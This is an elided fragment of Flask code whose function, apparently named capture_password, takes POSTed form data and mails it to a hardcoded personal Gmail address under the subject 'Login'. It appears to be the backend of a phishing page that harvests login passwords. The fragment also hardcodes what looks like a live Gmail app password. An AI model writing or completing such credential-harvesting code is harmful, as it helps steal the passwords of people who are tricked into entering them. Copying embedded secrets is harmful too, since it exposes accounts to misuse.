...
app.config['MAIL_PASSWORD'] = 'muzlrosvlhmhcukd'   # Your Gmail password or app-specific password
...
def capture_password():
    if request.method == 'POST':
        ...
        recipient =  'rm5508105@gmail.com'  # Your email address to receive the email
        subject = 'Login'
